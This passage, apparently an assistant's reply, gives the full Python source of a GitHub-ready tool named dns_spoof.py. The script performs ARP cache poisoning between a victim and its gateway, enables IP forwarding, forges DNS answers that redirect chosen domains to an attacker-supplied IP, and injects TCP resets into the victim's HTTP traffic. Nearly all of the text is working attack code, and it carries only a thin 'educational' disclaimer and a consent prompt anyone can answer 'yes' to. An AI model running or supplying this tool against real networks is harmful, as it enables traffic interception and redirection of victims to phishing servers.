### 2. Script File (`dns_spoof.py`)

This is the advanced version from the previous response, included here for completeness with minor tweaks for GitHub readiness (e.g., added shebang, version comment, and license header).

```python
#!/usr/bin/env python3
"""
DNS Spoofing Tool (Educational)
Author: Sujal Lamichhane
License: MIT
Version: 1.0.0
Description: A Python script demonstrating ARP and DNS spoofing for educational purposes.
             Use only in controlled lab environments with explicit permission.
"""

import logging
import time
import random
import signal
import sys
import threading
import socket
import os
import json
import queue
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from collections import defaultdict
from scapy.all import *
from scapy.config import conf
try:
    from pyfiglet import Figlet
    from termcolor import colored
except ImportError:
    print("Please install pyfiglet and termcolor: pip install pyfiglet termcolor")
    sys.exit(1)

# Configure buffered logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("dns_spoof.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Global variables
stop_event = threading.Event()
stats = defaultdict(int)
mac_cache = {}
rate_limit = 0.1  # Seconds between ARP packets
dns_queue = queue.Queue()
MAX_WORKERS = 4  # Thread pool size

def is_valid_ip(ip_str):
    """Check if the string is a valid IPv4 address."""
    try:
        socket.inet_aton(ip_str)
        return True
    except socket.error:
        return False

def is_valid_domain(domain):
    """Basic domain name validation."""
    return bool(domain and '.' in domain and all(c.isalnum() or c in '.-' for c in domain))

def get_interfaces():
    """List available network interfaces."""
    return get_if_list()

def attacker_mac(iface):
    """Returns the MAC address of the specified interface."""
    try:
        return get_if_hwaddr(iface)
    except Exception as e:
        logger.error(f"Error getting MAC for interface {iface}: {e}")
        return None

def get_mac(ip, iface, retries=3):
    """Returns the MAC address for the given IP with caching and retries."""
    if ip in mac_cache:
        return mac_cache[ip]
    for attempt in range(retries):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=iface, timeout=1, verbose=0)
            for _, received in ans:
                mac_cache[ip] = received.hwsrc
                return received.hwsrc
        except Exception as e:
            logger.warning(f"Attempt {attempt+1} failed for IP {ip}: {e}")
        time.sleep(0.5)
    logger.error(f"Failed to resolve MAC for IP {ip} after {retries} attempts.")
    return None

def enable_ip_forwarding():
    """Enable IP forwarding on Linux."""
    if sys.platform.startswith('linux'):
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            logger.info("IP forwarding enabled.")
            return True
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {e}")
            return False
    return True

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface):
    """Restores the ARP tables of the victim and gateway."""
    logger.info("Restoring ARP tables...")
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=gateway_mac, hwdst=victim_mac), count=5, iface=iface, verbose=0)
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=victim_mac, hwdst=gateway_mac), count=5, iface=iface, verbose=0)
    logger.info("ARP tables restored.")

def rate_limited_send(packet, iface, interval):
    """Send packet with rate limiting."""
    now = time.time()
    if not hasattr(rate_limited_send, 'last_sent'):
        rate_limited_send.last_sent = 0
    if now - rate_limited_send.last_sent >= interval:
        send(packet, iface=iface, verbose=0)
        rate_limited_send.last_sent = now
        return True
    return False

def arp_spoof(victim_ip, gateway_ip, iface):
    """Optimized ARP spoofing with rate limiting and caching."""
    victim_mac = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    if not victim_mac or not gateway_mac:
        logger.error("Failed to obtain MAC addresses. Exiting ARP spoofing.")
        stop_event.set()
        return

    logger.info(f"Victim MAC: {victim_mac} | Gateway MAC: {gateway_mac}")
    attacker_mac_addr = attacker_mac(iface)
    if not attacker_mac_addr:
        logger.error("Failed to get attacker's MAC. Exiting.")
        stop_event.set()
        return

    try:
        while not stop_event.is_set():
            arp_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac_addr, hwdst=victim_mac)
            arp_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac_addr, hwdst=gateway_mac)
            if rate_limited_send(arp_victim, iface, rate_limit):
                stats['arp_sent'] += 1
            if rate_limited_send(arp_gateway, iface, rate_limit):
                stats['arp_sent'] += 1
            time.sleep(0.1)  # Fine-grained sleep for responsiveness
    except Exception as e:
        logger.error(f"Error in ARP spoofing: {e}")
    finally:
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)

def dns_sniff_and_spoof(victim_ip, domains, fake_ip, iface):
    """Asynchronous DNS sniffing and spoofing for multiple domains."""
    def packet_handler(pkt):
        if stop_event.is_set():
            return
        if pkt.haslayer(DNSQR) and pkt[IP].src == victim_ip:
            qname = pkt[DNSQR].qname.decode().rstrip('.')
            if any(domain in qname for domain in domains):
                try:
                    qtype = pkt[DNSQR].qtype
                    rdata = fake_ip if qtype == 1 else '::1' if qtype == 28 else fake_ip  # A or AAAA
                    spoofed_pkt = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                                  UDP(dport=pkt[UDP].sport, sport=53) /
                                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                      an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=rdata, type=qtype)))
                    send(spoofed_pkt, iface=iface, verbose=0)
                    logger.info(f"Spoofed DNS: {qname} -> {rdata} (Type: {qtype})")
                    stats['dns_spoofed'] += 1
                except Exception as e:
                    logger.error(f"Error spoofing DNS packet: {e}")

    logger.info(f"Starting DNS sniffing for domains: {', '.join(domains)}")
    try:
        sniffer = AsyncSniffer(
            filter=f"udp port 53 and ip src {victim_ip}",
            prn=packet_handler,
            iface=iface,
            store=0,
            stop_filter=lambda x: stop_event.is_set()
        )
        sniffer.start()
        sniffer.join()
    except Exception as e:
        logger.error(f"Error in DNS sniffing: {e}")
        stop_event.set()

def http_redirect(victim_ip, fake_ip, iface):
    """Spoof HTTP responses to redirect HTTPS attempts (basic)."""
    def packet_handler(pkt):
        if stop_event.is_set():
            return
        if pkt.haslayer(TCP) and pkt[IP].src == victim_ip and pkt[TCP].dport == 80:
            try:
                # Send TCP RST to force browser retry
                rst = IP(dst=pkt[IP].src, src=pkt[IP].dst)/TCP(dport=pkt[TCP].sport, sport=80, flags="R")
                send(rst, iface=iface, verbose=0)
                stats['http_rst'] += 1
            except Exception as e:
                logger.error(f"Error sending HTTP RST: {e}")

    logger.info("Starting HTTP redirection spoofing...")
    try:
        sniff(filter=f"tcp port 80 and ip src {victim_ip}", prn=packet_handler, iface=iface, store=0, stop_filter=lambda x: stop_event.is_set())
    except Exception as e:
        logger.error(f"Error in HTTP spoofing: {e}")
        stop_event.set()

def display_stats():
    """Display real-time attack statistics."""
    while not stop_event.is_set():
        sys.stdout.write(f"\rARP Sent: {stats['arp_sent']} | DNS Spoofed: {stats['dns_spoofed']} | HTTP RST: {stats['http_rst']}")
        sys.stdout.flush()
        time.sleep(1)

def signal_handler(sig, frame):
    logger.info("Received interrupt. Stopping attack...")
    stop_event.set()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def display_banner():
    """Display the disclaimer and author name."""
    try:
        f = Figlet(font='slant')
        banner = f.renderText("Sujal Lamichhane")
        print(colored(banner, 'cyan'))
    except:
        print("Author: Sujal Lamichhane")
    disclaimer = (
        "===================================\n"
        "Disclaimer: This tool is for educational and ethical purposes only.\n"
        "Use only with explicit permission on networks you own or are authorized to test.\n"
        "Any illegal use is the sole responsibility of the user.\n"
        "===================================\n"
    )
    print(colored(disclaimer, 'red'))

def load_domains():
    """Load domains from a file or return defaults."""
    try:
        with open('spoof_domains.json', 'r') as f:
            data = json.load(f)
            return data.get('domains', [])
    except FileNotFoundError:
        return []

def save_domains(domains):
    """Save domains to a file."""
    with open('spoof_domains.json', 'w') as f:
        json.dump({'domains': domains}, f)

def main():
    display_banner()
    time.sleep(2)

    # List and select interface
    interfaces = get_interfaces()
    if not interfaces:
        logger.error("No network interfaces found.")
        sys.exit(1)
    print(colored("Available interfaces:", 'yellow'), interfaces)
    iface = input(colored("Enter network interface (e.g., eth0): ", 'yellow')).strip()
    if iface not in interfaces:
        logger.error("Invalid interface selected.")
        sys.exit(1)
    conf.iface = iface

    # Gather user inputs
    victim_ip = input(colored("Enter Victim's IP Address: ", 'yellow')).strip()
    gateway_ip = input(colored("Enter Gateway/DNS Server's IP Address: ", 'yellow')).strip()
    fake_ip = input(colored("Enter Fake IP Address to Redirect to: ", 'yellow')).strip()
    domains_input = input(colored("Enter Domains to Spoof (comma-separated, e.g., example.com, test.com) or leave empty to load from file: ", 'yellow')).strip()

    # Validate inputs
    if not (is_valid_ip(victim_ip) and is_valid_ip(gateway_ip) and is_valid_ip(fake_ip)):
        logger.error("Invalid IP address provided.")
        sys.exit(1)

    # Load or parse domains
    domains = load_domains()
    if domains_input:
        domains = [d.strip() for d in domains_input.split(',') if is_valid_domain(d.strip())]
        save_domains(domains)
    if not domains:
        logger.error("No valid domains provided.")
        sys.exit(1)

    # Confirm ethical use
    consent = input(colored("Do you have explicit permission to test this network? (yes/no): ", 'red')).strip().lower()
    if consent != 'yes':
        logger.error("Permission not granted. Exiting.")
        sys.exit(1)

    # Enable IP forwarding
    if not enable_ip_forwarding():
        logger.error("IP forwarding required but could not be enabled.")
        sys.exit(1)

    # Start stats display
    stats_thread = threading.Thread(target=display_stats)
    stats_thread.daemon = True
    stats_thread.start()

    # Start ARP spoofing
    arp_process = multiprocessing.Process(target=arp_spoof, args=(victim_ip, gateway_ip, iface))
    arp_process.start()

    # Start DNS spoofing
    dns_thread = threading.Thread(target=dns_sniff_and_spoof, args=(victim_ip, domains, fake_ip, iface))
    dns_thread.daemon = True
    dns_thread.start()

    # Start HTTP redirection (optional)
    http_thread = threading.Thread(target=http_redirect, args=(victim_ip, fake_ip, iface))
    http_thread.daemon = True
    http_thread.start()

    # Keep main thread alive
    try:
        while not stop_event.is_set():
            time.sleep(0.1)
    except KeyboardInterrupt:
        stop_event.set()
        arp_process.terminate()
        arp_process.join()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logger.error(f"An unexpected error occurred: {e}")
        stop_event.set()
